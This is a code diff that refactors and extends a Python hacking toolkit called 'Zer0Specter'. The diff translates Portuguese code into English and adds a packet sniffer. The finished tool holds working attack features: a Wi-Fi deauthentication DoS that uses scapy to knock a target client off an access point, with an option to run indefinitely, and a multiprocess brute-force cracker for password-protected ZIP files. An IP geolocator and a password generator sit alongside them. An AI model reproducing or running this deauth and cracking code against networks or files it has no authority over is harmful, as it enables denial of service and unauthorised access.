@@ -7,15 +7,14 @@ import sys
 import requests
 import time
 import os
-import prompt_toolkit
 import readline
+import prompt_toolkit
 import argparse
-from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
-import selenium
-from functools import partial
+from scapy.all import *
+from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, ARP, IP, TCP, UDP, ICMP, Ether
 
-#printar a logo bonitinha
-ascii_zero = (r"""
+# ASCII banner
+ascii_zero = r"""
  ________                   __                     
 /\_____  \                /'__`\                   
 \/____//'/'     __  _ __ /\ \/\ \                  
@@ -35,7 +34,7 @@ ascii_zero = (r"""
 |           PENETRATION &          |
 |             EXPLOIT              |
 +----------------------------------+              
-""")
+"""
 def slow_print(text, delay=0.002):
     for char in text:
         sys.stdout.write(char)
@@ -60,201 +59,262 @@ def banner():
     loading_bar()
     time.sleep(0.3)
     slow_print("Ready.\n", 0.02)
-if __name__ == "__main__":
-    banner()
 
-#funcoes auxiliares
+# Helper for ZIP cracking
 def worker_try_password(args_tuple):
-    sen, arq = args_tuple  # desempacota os argumentos
+    password, zip_path = args_tuple
     try:
-        with pyzipper.AESZipFile(arq, 'r') as zp:
-            zp.extractall(pwd=sen.encode())
-        return (sen, True)
+        with pyzipper.AESZipFile(zip_path, 'r') as zf:
+            zf.extractall(pwd=password.encode())
+        return (password, True)
     except:
-        return (sen, False)
+        return (password, False)
 
-#features
-def zipcrack(argus):
+# --- FEATURE: Friendly Packet Sniffer ---
+def sniffer(argus):
     def args():
-        argumentos = argparse.ArgumentParser(description="zipcracker")
-        argumentos.add_argument("-l", "--letters", dest="esc1", help="add letters on password")
-        argumentos.add_argument("-n", "--numbers", dest="esc2", help="add numbers")
-        argumentos.add_argument("-sc", "--specialcharacters", dest="esc3", help="add specialcharacters")
-        argumentos.add_argument("-s", "--size", dest="cs", type=int, help="estimated password length")
-        argumentos.add_argument("-p", "--path", dest="arq", help="dir path")
-        return argumentos.parse_args(argus)
-    
-    def escolhas(argu):
-        senha = ""
-        if argu.esc1 == 'y':
-            senha += string.ascii_letters
-        if argu.esc2 == 'y':
-            senha += string.digits
-        if argu.esc3 == 'y':
-            senha += string.punctuation
-        if not senha:
-            print('nothing selected, ending...')
-            exit()
-        return senha
-    
-    argu = args()
-    senha = escolhas(argu)
-    
-    def generate_combinations():
-        for sla in product(senha, repeat=argu.cs):
-            yield (''.join(sla), argu.arq)
+        parser = argparse.ArgumentParser(description="Friendly packet sniffer (like tcpdump)")
+        parser.add_argument("-i", "--interface", dest="interface", help="Network interface to sniff on", default=None)
+        parser.add_argument("-si", "--showinterfaces", dest="sinterfaces", action="store_true", help="List available network interfaces")
+        return parser.parse_args(argus)
 
+    args_parsed = args()
+
+    if args_parsed.sinterfaces:
+        print("\n[+] Available network interfaces:")
+        for idx, iface in enumerate(ifaces):
+            print(f"  {idx}: {iface}")
+        return
+
+    if not args_parsed.interface:
+        print("[!] Error: Please specify an interface with -i/--interface.")
+        print("    Use --showinterfaces to list available interfaces.")
+        return
+
+    print(f"\n[+] Starting friendly sniffer on interface: {args_parsed.interface}")
+    print("[+] Press Ctrl+C to stop.\n")
+    print(f"{'TIME':<10} {'PROTOCOL':<8} {'SOURCE':<22} {'DESTINATION':<22} {'INFO'}")
+    print("-" * 80)
+
+    def process_packet(packet):
+        try:
+            ts = time.strftime("%H:%M:%S", time.localtime())
+            proto = "OTHER"
+            src = dst = "N/A"
+            info = ""
+
+            if packet.haslayer(IP):
+                src = packet[IP].src
+                dst = packet[IP].dst
+                proto_num = packet[IP].proto
+                if proto_num == 6:
+                    proto = "TCP"
+                elif proto_num == 17:
+                    proto = "UDP"
+                elif proto_num == 1:
+                    proto = "ICMP"
+                else:
+                    proto = f"IP({proto_num})"
+
+                if packet.haslayer(TCP):
+                    sport = packet[TCP].sport
+                    dport = packet[TCP].dport
+                    info = f"{sport} → {dport}"
+                elif packet.haslayer(UDP):
+                    sport = packet[UDP].sport
+                    dport = packet[UDP].dport
+                    info = f"{sport} → {dport}"
+                elif packet.haslayer(ICMP):
+                    info = f"Type {packet[ICMP].type} Code {packet[ICMP].code}"
+
+            elif packet.haslayer(ARP):
+                proto = "ARP"
+                src = packet[ARP].psrc
+                dst = packet[ARP].pdst
+                info = "who-has" if packet[ARP].op == 1 else "is-at"
+
+            elif packet.haslayer(Dot11):
+                proto = "WLAN"
+                src = packet[Dot11].addr2 or "N/A"
+                dst = packet[Dot11].addr1 or "N/A"
+                info = ""
+
+            else:
+                if packet.haslayer(Ether):
+                    src = packet[Ether].src
+                    dst = packet[Ether].dst
+                info = f"{len(packet)} bytes"
+
+            src = (src[:20] + "..") if len(src) > 20 else src
+            dst = (dst[:20] + "..") if len(dst) > 20 else dst
+            info = (info[:30] + "..") if len(info) > 30 else info
+
+            print(f"{ts:<10} {proto:<8} {src:<22} {dst:<22} {info}")
+
+        except Exception:
+            pass  # Skip malformed packets silently
+
+    try:
+        sniff(iface=args_parsed.interface, prn=process_packet, store=False)
+    except PermissionError:
+        print("\n[!] Permission denied. Please run as root/Administrator.")
+    except KeyboardInterrupt:
+        print("\n\n[+] Sniffer stopped by user.")
+# --- FEATURE: ZIP Password Cracker ---
+def zipcrack(argus):
+    parser = argparse.ArgumentParser(description="Crack password-protected ZIP files")
+    parser.add_argument("-l", "--letters", dest="use_letters", help="Include letters (y/n)", default='n')
+    parser.add_argument("-n", "--numbers", dest="use_numbers", help="Include digits (y/n)", default='n')
+    parser.add_argument("-sc", "--specialcharacters", dest="use_special", help="Include special characters (y/n)", default='n')
+    parser.add_argument("-s", "--size", dest="length", type=int, required=True, help="Password length to test")
+    parser.add_argument("-p", "--path", dest="zip_path", required=True, help="Path to the target ZIP file")
+    args = parser.parse_args(argus)
+
+    charset = ""
+    if args.use_letters == 'y':
+        charset += string.ascii_letters
+    if args.use_numbers == 'y':
+        charset += string.digits
+    if args.use_special == 'y':
+        charset += string.punctuation
+
+    if not charset:
+        print("[ERROR] No character set selected. Exiting...")
+        return
+
+    def generate_combinations():
+        for combo in product(charset, repeat=args.length):
+            yield (''.join(combo), args.zip_path)
+
+    print(f"[INFO] Starting brute-force with charset: '{charset}' and length: {args.length}")
     with Pool(cpu_count()) as pool:
         total = 0
-        for comb, sus in pool.imap_unordered(worker_try_password, generate_combinations(), chunksize=500):
+        for password, success in pool.imap_unordered(worker_try_password, generate_combinations(), chunksize=500):
             total += 1
-            print(f'[{total}] Testing: {comb}')
-            if sus:
-                print(f'\n✅ Senha encontrada: {comb}')
+            print(f"[{total}] Testing: {password}")
+            if success:
+                print(f"\n✅ Password found: {password}")
                 pool.terminate()
-                return comb
-
+                return password
+    print("[INFO] Password not found.")
+# --- FEATURE: Password Generator ---
 def pass_gen(argus):
-    def arguments():
-        parser = argparse.ArgumentParser(description="pass generator")
-        parser.add_argument("-nc", "--numberchar", dest="cs", type=int, help="number of characters you password must have")
-        parser.add_argument("-p", "--punctuation", dest="q1", help="did it have special character?")
-        parser.add_argument("-n", "--numbers", dest="q2", help="did it have numbers?")
-        parser.add_argument("-up", "--uppercase", dest="q3")
-        return parser.parse_args(argus)
-    argum = arguments()
-    senhag = []
-    senhap = string.ascii_lowercase
-    if argum.q1 == 'y':
-        senhap += string.punctuation
-    if argum.q2 == 'y':
-        senhap += string.digits
-    if argum.q3 == 'y':
-        senhap += string.ascii_uppercase
+    parser = argparse.ArgumentParser(description="Generate a random secure password")
+    parser.add_argument("-nc", "--numberchar", dest="length", type=int, required=True, help="Password length")
+    parser.add_argument("-p", "--punctuation", dest="use_punct", help="Include special characters? (y/n)", default='n')
+    parser.add_argument("-n", "--numbers", dest="use_nums", help="Include numbers? (y/n)", default='n')
+    parser.add_argument("-up", "--uppercase", dest="use_upper", help="Include uppercase letters? (y/n)", default='n')
+    args = parser.parse_args(argus)
 
-    for _ in range (argum.cs):
-        passw = random.choice(senhap)
-        senhag.append(passw)
-    print ("".join(senhag))
+    charset = string.ascii_lowercase
+    if args.use_punct == 'y':
+        charset += string.punctuation
+    if args.use_nums == 'y':
+        charset += string.digits
+    if args.use_upper == 'y':
+        charset += string.ascii_uppercase
+
+    password = ''.join(random.choice(charset) for _ in range(args.length))
+    print(password)
+# --- FEATURE: Wi-Fi Deauthentication Attack ---
 def wifi_blackout(argus):
-    def args():
-        parser = argparse.ArgumentParser(description="WIFI Attack Deauth")
-        parser.add_argument("-i", "--interface", dest="interface", help="WIFI interface")
-        parser.add_argument("-a", "--ap", dest="bssid_ap", help="MAC from target")
-        parser.add_argument("-c", "--client", dest="bssid_client", help="MAC from client")
-        parser.add_argument("-n", "--count", dest="count", type=int, default=10, help="Packets count(0 for infinite)")
-        parser.add_argument("--interval", dest="interval", type=float, default=0.1, help="Time between packets")
-        return parser.parse_args(argus)
-    def BDP(ap_mac, client_mac):
-        packet = (
-            RadioTap()/
-            Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/
+    parser = argparse.ArgumentParser(description="Wi-Fi deauthentication (DoS) attack")
+    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Wireless interface (in monitor mode)")
+    parser.add_argument("-a", "--ap", dest="ap_mac", required=True, help="Target AP MAC address")
+    parser.add_argument("-c", "--client", dest="client_mac", required=True, help="Target client MAC address")
+    parser.add_argument("-n", "--count", dest="count", type=int, default=10, help="Number of deauth packets (0 = infinite)")
+    parser.add_argument("--interval", dest="interval", type=float, default=0.1, help="Interval between packets (seconds)")
+    args = parser.parse_args(argus)
+
+    def build_deauth_packet(ap_mac, client_mac):
+        from scapy.all import RadioTap, Dot11, Dot11Deauth
+        return (
+            RadioTap() /
+            Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
             Dot11Deauth(reason=7)
         )
-        return packet
-    def packetsend(packet, interface, count, interval):
-        if count == 0:
-            print("[INFO]Sending packets for ∞ times... CTRL+C to stop it")
-            sendp(packet, iface=interface, count=count, inter=interval, loop=1, verbose=1)
-        else:
-            print("[INFO]Sending packets for {count} times")
-            sendp(packet, iface=interface,count=count, inter=interval, verbose=1)
-    def main():
-        options = args()
-        pkt = BDP(options.bssid_ap, options.bssid_client)
-        packetsend = (pkt, options.interface, options.count, options.interval)
-    if __name__ == "__main__":
-        main()
+
+    packet = build_deauth_packet(args.ap_mac, args.client_mac)
+
+    if args.count == 0:
+        print("[INFO] Sending deauthentication packets indefinitely... (Press Ctrl+C to stop)")
+        sendp(packet, iface=args.interface, inter=args.interval, loop=1, verbose=True)
+    else:
+        print(f"[INFO] Sending {args.count} deauthentication packets...")
+        sendp(packet, iface=args.interface, count=args.count, inter=args.interval, verbose=True)
+# --- FEATURE: IP Geolocation ---
 def ip_locater(argus):
-    def arguments():
-        parser = argparse.ArgumentParser(description="ip locator")
-        parser.add_argument("-ip", type=str,help="ip from target or let empty for yours")
-        args = parser.parse_args()
-        return args.ip
-    def get_ip(ip):
-        try:
-            url = f"https://ipwho.is/{ip[1]}"
-            resposta = requests.get(url)
-            if resposta.status_code == 200:
-                return resposta.json()
+    parser = argparse.ArgumentParser(description="Geolocate an IP address")
+    parser.add_argument("-ip", type=str, nargs='?', default=None, help="Target IP address (leave empty for your own IP)")
+    args = parser.parse_args(argus)
+
+    target_ip = args.ip if args.ip else ""
+    try:
+        url = f"https://ipwho.is/{target_ip}" if target_ip else "https://ipwho.is/"
+        response = requests.get(url)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("success", True):
+                print("----- Result -----")
+                print(f"IP: {data.get('ip')}")
+                print(f"Country: {data.get('country')}")
+                print(f"Region: {data.get('region')}")
+                print(f"City: {data.get('city')}")
+                print(f"ISP: {data.get('isp')}")
+                print(f"Connection Type: {data.get('type')}")
+                print(f"Latitude: {data.get('latitude')}")
+                print(f"Longitude: {data.get('longitude')}")
             else:
-                return {"error": f"Falha na requisição, status: {resposta.status_code}"}
-        except Exception as e:
-            return {"error": str(e)}
-    def main():
-        arguments()
-        result = get_ip(argus)
-        if "error" in result:
-            print(f"Erro: {result['error']}")
+                print(f"[ERROR] API error: {data.get('message', 'Unknown')}")
         else:
-            print("""-----result-----""")
-            print(f"IP: {result.get('ip')}")
-            print(f"Country: {result.get('country')}")
-            print(f"Region: {result.get('region')}")
-            print(f"City: {result.get('city')}")
-            print(f"Providor (ISP): {result.get('isp')}")
-            print(f"Type: {result.get('type')}")
-            print(f"Latitude: {result.get('latitude')}")
-            print(f"Longitude: {result.get('longitude')}")
-    if __name__ == "__main__":
-        main()
+            print(f"[ERROR] Request failed. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"[ERROR] Exception occurred: {str(e)}")
 
-#execução
+# --- COMMAND REGISTRY ---
 FEATURES = {
-    "zipcrack": (zipcrack, "Crack password-protected zip files"),
+    "zipcrack": (zipcrack, "Crack password-protected ZIP files"),
     "passgen": (pass_gen, "Generate random secure passwords"),
-    "wifiblackout": (wifi_blackout, "A DoS tool for network attacks"),
-    "iplocator": (ip_locater, "A Ip locator/finder")
+    "wifiblackout": (wifi_blackout, "Perform Wi-Fi deauthentication (DoS) attacks"),
+    "iplocator": (ip_locater, "Geolocate an IP address"),
+    "sniffer": (sniffer, "Capture and display network packets in a friendly format"),
 }
-
 def show_help():
     print("\nAvailable commands:")
-    for feat, (_, desc) in FEATURES.items():
-        print(f"  {feat:<12} {desc}")
-    print("  help         Show this message")
-    print("  quit/exit    Exit the program\n")
-
+    for cmd, (_, desc) in FEATURES.items():
+        print(f"  {cmd:<15} {desc}")
+    print("  help            Show this help message")
+    print("  quit / exit     Exit the program\n")
 def main():
     while True:
-        userin = input("[Zer0Specter] > ").lower()
-        partes = userin.split()
-        feature = partes[0]
-        argumentos = partes[1:]
-        if feature == "zipcrack":
-            try:
-                zipcrack(argumentos)
-            except SystemExit:
-                print("Argument not recognized. Use '--help' for this command.")
-            except argparse.ArgumentError:
-                print("sintaxe error")
-        if feature == "passgen":
-            try:
-                pass_gen(argumentos)
-            except SystemExit:
-                print("Argument not recognized. Use '--help' for this command.")
-            except argparse.ArgumentError:
-                print("sintaxe error")
-        if feature == "wifiblackout":
-            try:
-                wifi_blackout(argumentos)
-            except SystemExit:
-                print("Argument not recognized. Use '--help' for this command.")
-            except argparse.ArgumentError:
-                print("sintaxe error")
-        if feature == "iplocator":
-            try:
-                ip_locater(argumentos)
-            except SystemExit:
-                print("Argument not recognized. Use '--help' for this command.")
-            except argparse.ArgumentError:
-                print("sintaxe error")
-        if feature in ["quit", "exit"]:
-            print("ending...")
-            time.sleep(2)
-            exit()
-        if feature == "clear":
-            os.system('clear')
-        elif feature == "help":
-            show_help()
-if __name__ == "__main__" :
+        try:
+            user_input = input("[Zer0Specter] > ").strip()
+            if not user_input:
+                continue
+            parts = user_input.split()
+            command = parts[0].lower()
+            args = parts[1:]
+
+            if command in FEATURES:
+                try:
+                    FEATURES[command][0](args)
+                except SystemExit:
+                    pass  # argparse already printed help/error
+                except Exception as e:
+                    print(f"[ERROR] An unexpected error occurred: {e}")
+            elif command in ["quit", "exit"]:
+                print("Exiting...")
+                time.sleep(1)
+                break
+            elif command == "clear":
+                os.system("clear" if os.name != "nt" else "cls")
+            elif command == "help":
+                show_help()
+            else:
+                print(f"[ERROR] Unknown command: '{command}'. Type 'help' for available commands.")
+        except KeyboardInterrupt:
+            print("\n\nExiting...")
+            break
+if __name__ == "__main__":
+    banner()
     main()
